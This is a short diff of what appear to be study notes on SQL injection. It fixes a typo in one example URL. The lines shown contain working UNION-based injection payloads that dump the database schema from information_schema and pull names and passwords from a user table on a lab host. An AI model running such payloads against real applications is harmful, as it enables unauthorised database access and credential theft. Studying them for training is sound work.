@@ -225,7 +225,7 @@ POST Method
          - Dumping/extracting information via golden statement 
               statement in question - SELECT table_schema,table_name,column_name FROM information_schema.columns
                ex. Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns; # (found schema session, with table user, with columns name, pass)
-               ex. http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column.name,table_name from information_schema.columns
+               ex. http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns
          - Extracting desired information
                ex. Audi' UNION select id,2,name,pass,5 from session.user; #
 
